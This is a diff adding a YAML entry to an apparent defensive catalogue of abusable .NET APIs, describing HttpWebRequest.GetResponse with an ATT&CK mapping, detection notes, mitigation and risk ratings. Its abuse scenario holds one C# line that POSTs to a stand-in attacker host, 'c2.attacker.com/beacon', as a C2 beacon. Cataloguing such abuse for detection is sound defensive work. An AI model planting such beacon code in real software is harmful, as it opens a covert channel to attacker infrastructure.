@@ -1,0 +1,51 @@
+name: System.Net.HttpWebRequest.GetResponse
+category: windows-dotnet-api
+subcategory: network-communication
+api:
+  namespace: System.Net
+  language: .NET 1.1+
+  documentation: https://learn.microsoft.com/en-us/dotnet/api/system.net.httpwebrequest.getresponse
+  class: HttpWebRequest
+  method: GetResponse
+abuse_scenarios:
+- name: C2 beacon communication
+  technique_id: T1071.001
+  description: Establish persistent C2 channel over HTTP
+  code_snippet: HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://c2.attacker.com/beacon");
+    req.Method = "POST"; var resp = req.GetResponse();
+  detection_difficulty: medium
+  common_in_campaigns: true
+detection:
+- vendor: Network IDS
+  effectiveness: medium
+  notes: Monitor for suspicious HTTP beacon patterns
+- vendor: Proxy logs
+  effectiveness: high
+  notes: Detect C2 communication patterns
+mitigation:
+- category: network
+  description: Block known C2 domains
+  feasibility: high
+risk:
+  severity: high
+  prevalence: widespread
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 85
+references:
+  techniques:
+  - T1071.001
+  threat_actors:
+  - APT28
+  - FIN7
+  malware_families:
+  - Various malware families
+  tools:
+  - Cobalt Strike
+tags:
+- windows-dotnet-api
+- c2
+- network
+id: 69c46d16-1c46-4588-bbd3-07a9d5265eb5
+author: magicsword-io
+created: '2026-02-02'
+verified: true
